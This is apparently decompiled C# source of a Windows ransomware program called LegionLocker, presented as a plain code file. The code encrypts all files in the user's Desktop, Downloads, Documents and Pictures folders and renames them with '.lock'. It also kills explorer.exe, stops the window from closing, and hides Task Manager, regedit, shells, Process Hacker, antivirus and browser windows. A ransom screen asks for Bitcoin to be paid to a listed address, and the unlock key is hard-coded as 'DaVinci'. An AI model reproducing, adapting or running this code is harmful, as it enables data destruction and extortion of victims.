using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace LegionLocker;

public class Form1 : Form
{
	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".lock");
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	private const int SW_HIDE = 0;

	private IContainer components = null;

	private Panel panel1;

	private Label label2;

	private Label label1;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label label7;

	private Label label6;

	private Button button5;

	private TextBox textBox1;

	private Label label5;

	private Label label4;

	private Label label3;

	private Button button2;

	private Button button4;

	private Label label11;

	private Label label10;

	private Label label9;

	private Label label8;

	private Button button6;

	private Timer tmr_start_enc;

	private Timer tmr_del_desktop;

	private Timer tmr_if;

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/k color 47 && taskkill /f /im explorer.exe && Exit";
		Process.Start(processStartInfo);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Documents");
		string text3 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "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";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			encryptionFile.EncryptFile(files4[k], password);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			encryptionFile.EncryptFile(files3[l], password);
		}
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + "\\desktop.ini";
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path4 = folderPath3 + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "powershell")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker2")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "mmc")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "mmc.exe")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "taskmgr.exe")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "taskmgr")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "avastui")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "chrome")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "firefox")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "ProcessHacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "ProcessHacker.exe")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "ProcessHacker2.exe")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "AvastUI")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "AvastUI.exe")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			tmr_if.Start();
		}
	}

	private void button5_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "JMYShWqVfZdtYAbCKLUX3kBvW8EkbrQRDB6HHr2KRm7AADsZYp5YTFXqHmYFZ9xUrVcuYV2G9dYkM2g5ZJdv4C88Yf5mtX8TGdNNhpksVps5uRmcSHqR4uu9JGTRsgnANCqwf8JzpDL3Hs7Dz4C8AfN5vBzPP9cxMT2xdxE7Y3bSwgmSVFbuFe7sakWRDcLSTGxDAydjYuR7cENGjT9anyaCWCMZVGsq8ssjgDzwrFWyjS7Tw7yKxPqGfqfr5k3N")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "DaVinci")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			OFF_Encrypt();
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Documents");
		string text3 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "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";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			decryptionFile.DecryptFile(files4[k], password);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			decryptionFile.DecryptFile(files3[l], password);
		}
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Contact contact = new Contact();
		((Form)contact).ShowDialog();
	}

	private void button6_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Rules rules = new Rules();
		((Form)rules).ShowDialog();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Whatisbitcoin whatisbitcoin = new Whatisbitcoin();
		((Form)whatisbitcoin).ShowDialog();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_02e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ee: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0437: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		//IL_04e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ec: Expected O, but got Unknown
		//IL_0589: Unknown result type (might be due to invalid IL or missing references)
		//IL_0593: Expected O, but got Unknown
		//IL_0631: Unknown result type (might be due to invalid IL or missing references)
		//IL_063b: Expected O, but got Unknown
		//IL_0765: Unknown result type (might be due to invalid IL or missing references)
		//IL_076f: Expected O, but got Unknown
		//IL_0807: Unknown result type (might be due to invalid IL or missing references)
		//IL_0811: Expected O, but got Unknown
		//IL_08ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b8: Expected O, but got Unknown
		//IL_0955: Unknown result type (might be due to invalid IL or missing references)
		//IL_095f: Expected O, but got Unknown
		//IL_09fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a06: Expected O, but got Unknown
		//IL_0aa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aaa: Expected O, but got Unknown
		//IL_0b24: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2e: Expected O, but got Unknown
		//IL_0b94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9e: Expected O, but got Unknown
		//IL_0c29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c33: Expected O, but got Unknown
		//IL_0ce3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ced: Expected O, but got Unknown
		//IL_0da0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0daa: Expected O, but got Unknown
		//IL_0f70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7a: Expected O, but got Unknown
		//IL_0fb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc1: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		panel1 = new Panel();
		label11 = new Label();
		label10 = new Label();
		label9 = new Label();
		label8 = new Label();
		label7 = new Label();
		label6 = new Label();
		button5 = new Button();
		textBox1 = new TextBox();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		button2 = new Button();
		button4 = new Button();
		button6 = new Button();
		tmr_start_enc = new Timer(components);
		tmr_del_desktop = new Timer(components);
		tmr_if = new Timer(components);
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.DimGray);
		((Control)panel1).get_Controls().Add((Control)(object)label11);
		((Control)panel1).get_Controls().Add((Control)(object)label10);
		((Control)panel1).get_Controls().Add((Control)(object)label9);
		((Control)panel1).get_Controls().Add((Control)(object)label8);
		((Control)panel1).get_Controls().Add((Control)(object)label7);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)button5);
		((Control)panel1).get_Controls().Add((Control)(object)textBox1);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_Location(new Point(176, 74));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(664, 402));
		((Control)panel1).set_TabIndex(0);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label11).set_ForeColor(Color.Red);
		((Control)label11).set_Location(new Point(92, 342));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(431, 16));
		((Control)label11).set_TabIndex(13);
		((Control)label11).set_Text("Our bitcoin address: 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_BackColor(Color.Black);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label10).set_ForeColor(Color.Lime);
		((Control)label10).set_Location(new Point(226, 245));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(226, 16));
		((Control)label10).set_TabIndex(12);
		((Control)label10).set_Text("If you already paid click \"Contact us\" ");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_BackColor(Color.Black);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label9).set_ForeColor(Color.Lime);
		((Control)label9).set_Location(new Point(148, 220));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(401, 16));
		((Control)label9).set_TabIndex(11);
		((Control)label9).set_Text("And send the correct amount to the adress specified in this window.");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_BackColor(Color.Black);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label8).set_ForeColor(Color.Lime);
		((Control)label8).set_Location(new Point(0, 194));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(666, 16));
		((Control)label8).set_TabIndex(10);
		((Control)label8).set_Text("Please check the current price of Bitcoin and buy some Bitcoins for more information, click \"How to buy bitcoin?\".");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_BackColor(Color.Black);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label7).set_ForeColor(Color.Lime);
		((Control)label7).set_Location(new Point(81, 167));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(488, 16));
		((Control)label7).set_TabIndex(9);
		((Control)label7).set_Text("Payment is accepted in Bitcoin only. For more information , click \"What is bitcoin?\"");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_BackColor(Color.Black);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label6).set_ForeColor(Color.Lime);
		((Control)label6).set_Location(new Point(287, 137));
		((Control)label6).set_Name("label6");
